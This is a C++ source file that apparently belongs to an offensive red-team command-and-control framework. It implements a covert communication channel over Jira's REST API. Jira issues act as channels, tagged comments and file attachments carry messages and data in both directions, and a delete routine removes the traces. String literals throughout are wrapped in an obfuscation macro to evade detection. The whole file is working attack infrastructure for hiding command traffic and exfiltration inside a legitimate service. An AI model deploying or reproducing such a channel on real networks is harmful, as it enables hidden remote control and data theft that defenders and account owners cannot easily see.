#include "stdafx.h"
#include "JiraApi.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"
#include "Common/FSecure/Crypto/Base64.h"
#include <random>
#include <cctype>
#include <algorithm>
#include <fstream>

using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

namespace
{
	std::wstring ToWideString(std::string const& str)
	{
		return Convert<Utf16>(str);
	}
}

FSecure::Jira::Jira(std::string const& userAgent, std::string const& host, std::string const& project_key, std::string const& issue_name, std::string const& username, std::string const& password)
{
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);

	this->m_host = host;
	while (!m_host.empty() && m_host.back() == '/') m_host.pop_back();

	this->m_projectkey = project_key;
	this->m_UserAgent = userAgent;

	SetAuthToken(username, password);
	SetChannel(CreateIssue(issue_name));
}

void FSecure::Jira::SetChannel(std::string const& issueId)
{
	this->m_issue = issueId;
}

void FSecure::Jira::SetAuthToken(std::string const& username, std::string const& password)
{
	this->m_authtoken = cppcodec::base64_rfc4648::encode<std::string>(username + ":" + password);
}

void FSecure::Jira::UpdateCommentOnIssue(std::string const& commentId, std::string const& message)
{
	std::string url = this->m_host + OBF_STR("/rest/api/2/issue/") + this->m_issue + OBF("/comment/") + commentId;

	json j;
	j[OBF("body")] = message;

	SendJsonRequest(Method::PUT, url, j);
}

std::string FSecure::Jira::WriteCommentOnIssue(std::string const& message)
{
	std::string url = this->m_host + OBF_STR("/rest/api/2/issue/") + this->m_issue + OBF("/comment");

	json j;
	j[OBF("body")] = message;

	json resp = SendJsonRequest(Method::POST, url, j);
	return resp[OBF("id")];
}

void FSecure::Jira::UploadAttachment(ByteView data, std::string const& commentId)
{
	std::string url = this->m_host + OBF("/rest/api/2/issue/") + this->m_issue + OBF("/attachments");

	// Generating body
	std::string boundary = OBF("----------------------") + Utils::GenerateRandomString(24);

	// Building the multipart body
	std::vector<uint8_t> body;
	std::string bodyPrefix = OBF("----") + boundary + OBF("\r\n");
	bodyPrefix += OBF("Content-Disposition: form-data; name=\"file\"; filename=\"") + commentId + OBF("\"") + OBF("\r\n");
	bodyPrefix += OBF("Content-Type: application/octet-stream\r\n\r\n");

	body.insert(body.begin(), bodyPrefix.begin(), bodyPrefix.end()); // Insert the prefix
	body.insert(body.end(), data.begin(), data.end()); // Insert the attachment content
	std::string bodySuffix = OBF("\r\n");
	bodySuffix += OBF("--") + boundary + OBF("--") + OBF("\r\n");
	body.insert(body.end(), bodySuffix.begin(), bodySuffix.end()); // Insert the suffix

	std::string contentType = OBF("multipart/form-data; boundary=") + boundary;

	SendHttpRequest(Method::POST, url, ToWideString(contentType), body, false);
}

void FSecure::Jira::DeleteIssue()
{
	std::string url = this->m_host + OBF("/rest/api/2/issue/") + this->m_issue;
	SendHttpRequest(Method::DEL, url);
}

std::map<std::string, std::string> FSecure::Jira::ListIssues()
{
	std::map<std::string, std::string> channelMap;
	std::string url = this->m_host + OBF("/rest/api/2/search?jql=project=") + this->m_projectkey + OBF("&fields=key,summary"); // max results = 50 by default

	std::int32_t startAt = 0;

	while(true){
		std::string startAtString = "";
		if (startAt > 0)
			startAtString = OBF("&startAt=") + std::to_string(startAt);

		json response = json::parse(SendHttpRequest(Method::GET, url + startAtString));

		for (auto& issue : response.at(OBF("issues"))) {
			channelMap.emplace(issue[OBF("fields")][OBF("summary")], issue[OBF("key")]);
		}
		// From our current result number, plus the max results we're getting back in each request
		// have we reached the total number of results? If we're under the total let's shift our
		// starting result and go again.
		if ((startAt + response[OBF("maxResults")].get<int32_t>()) < response[OBF("total")].get<int32_t>())
			startAt += response.at(OBF("maxResults")).get<uint32_t>();
		else
			break;
	}
	return channelMap;
}

std::string FSecure::Jira::CreateIssue(std::string const& issueName)
{
	if (auto issues = ListIssues(); issues.find(issueName) != issues.end())
		return issues[issueName];

	std::string url = this->m_host + OBF("/rest/api/2/issue");

	json j;
	j[OBF("fields")][OBF("project")][OBF("key")] = this->m_projectkey;
	j[OBF("fields")][OBF("summary")] = issueName;
	j[OBF("fields")][OBF("issuetype")][OBF("name")] = OBF("Task");

	json response = SendJsonRequest(Method::POST, url, j);
	std::string channelCreated = response[OBF("key")];

	return channelCreated;
}

std::map<std::string, std::string> FSecure::Jira::GetMessagesByDirection(std::string const& direction)
{
	std::string url = this->m_host + OBF("/rest/api/2/issue/") + this->m_issue + OBF("/comment?orderBy=created");
	std::map<std::string, std::string> messages;

	std::uint32_t startAt = 0;

	while (true) {
		std::string startAtString = "";
		if (startAt > 0)
			startAtString = OBF("&startAt=") + std::to_string(startAt);

		json response = json::parse(SendHttpRequest(Method::GET, url + startAtString));

		for (auto& match : response[OBF("comments")])
		{
			std::string_view data = match[OBF("body")].get<std::string_view>();
			//make sure it's a message we care about
			if (data == direction)
			{
				messages.insert({ match[OBF("created")].get<std::string>(), match[OBF("id")].get<std::string>() });
			}
		}

		// From our current result number, plus the max results we're getting back in each request
		// have we reached the total number of results? If we're under the total let's shift our
		// starting result and go again.
		if ((startAt + response[OBF("maxResults")].get<int32_t>()) < response[OBF("total")].get<int32_t>())
			startAt += response.at(OBF("maxResults")).get<uint32_t>();
		else
			break;
	}
	return messages;
}

std::vector<std::tuple<std::string, std::string, int>> FSecure::Jira::ReadCommentReplies(std::string const& commentId)
{
	std::string url = this->m_host + OBF("/rest/api/2/issue/") + this->m_issue;
	json response = json::parse(SendHttpRequest(Method::GET, url));

	std::vector<std::tuple<std::string, std::string, int>> ret;
	auto attachments = response[OBF("fields")][OBF("attachment")];

	for (auto&& file : attachments)
		if (auto found = std::string{ file.at(OBF("filename")) }.find(commentId); found != std::string::npos)
		{
			auto attachmentContents = SendHttpRequest(Method::GET, file.at(OBF("content")));
			auto id = file.at(OBF("id"));
			// If we've got attachments tied to a comment, there won't be additional comments as well so we can return here
			return ret.emplace_back(id, ByteView{ attachmentContents }, ATTACHMENT), ret;
		}

	std::uint32_t startAt = 0;
	auto commentsBlock = response[OBF("fields")][OBF("comment")];
	url = this->m_host + OBF("/rest/api/2/issue/") + this->m_issue + OBF("/comment?orderBy=created");

	while(true)
	{
		auto comments = commentsBlock[OBF("comments")];
		for (size_t i = 0u; i < comments.size(); i++)
		{
			auto& reply = comments[i];

			std::size_t found = reply[OBF("body")].get<std::string>().find(commentId + ":");

			if (found != std::string::npos)
			{
				std::string trimmed_data = reply[OBF("body")].get<std::string>();
				size_t length = commentId.length() + 1; // id + ':'
				trimmed_data.erase(0, length);
				std::string text = trimmed_data;

				std::string id = reply[OBF("id")].get<std::string>();

				ret.emplace_back(std::move(id), std::move(text), COMMENT);
			}
		}

		if ((startAt + commentsBlock[OBF("maxResults")].get<int32_t>()) < commentsBlock[OBF("total")].get<int32_t>())
		{
			startAt += commentsBlock.at(OBF("maxResults")).get<uint32_t>();
			commentsBlock = json::parse(SendHttpRequest(Method::GET, url + OBF("&startAt=") + std::to_string(startAt)));
		}
		else
			break;
	}
	return ret;
}

void FSecure::Jira::DeleteComment(std::string const& commentId)
{
	std::string url = this->m_host + OBF("/rest/api/2/issue/") + this->m_issue + OBF("/comment/") + commentId;
	SendHttpRequest(Method::DEL, url);
}

void FSecure::Jira::DeleteAttachment(std::string const& attachmentId)
{
	std::string url = this->m_host + OBF("/rest/api/2/attachment/") + attachmentId;
	SendHttpRequest(Method::DEL, url);
}

FSecure::ByteVector FSecure::Jira::SendHttpRequest(FSecure::WinHttp::Method method, std::string const& host, std::wstring const& contentType, std::vector<uint8_t> data, bool xsrfCheck)
{
	HttpClient webClient(ToWideString(host), m_ProxyConfig);
	HttpRequest request = CreateHttpRequest(method, host, contentType, data, xsrfCheck);

	while (true)
	{
		auto resp = webClient.Request(request);

		if ((resp.GetStatusCode() == StatusCode::OK) or (resp.GetStatusCode() == StatusCode::Created))
			return resp.GetData();
		else if (resp.GetStatusCode() == StatusCode::NoContent)
			return {};
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests)
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		else
			throw std::runtime_error(OBF("[x] Non 200/429 HTTP Response\n"));
	}
}

FSecure::WinHttp::HttpRequest FSecure::Jira::CreateHttpRequest(FSecure::WinHttp::Method method, std::string const& host, std::wstring const& contentType, std::vector<uint8_t> data, bool xsrfCheck)
{
	HttpRequest request;
	request.m_Method = method;
	request.SetTimeout({}, {}, 0ms, 0ms);

	if (!contentType.empty() && !data.empty())
	{
		request.SetData(contentType, data);
	}

	request.SetHeader(Header::Authorization, OBF(L"Basic ") + ToWideString(this->m_authtoken));

	if (!xsrfCheck)
		request.SetHeader(ToWideString("X-Atlassian-Token"), ToWideString(OBF("no-check")));

	request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));

	return request;
}

json FSecure::Jira::SendJsonRequest(FSecure::WinHttp::Method method, std::string const& url, json const& data)
{
	std::string jsonDump = data.dump();
	return json::parse(SendHttpRequest(method, url, GetContentType(ContentType::ApplicationJson), { jsonDump.begin(), jsonDump.end() }));
}
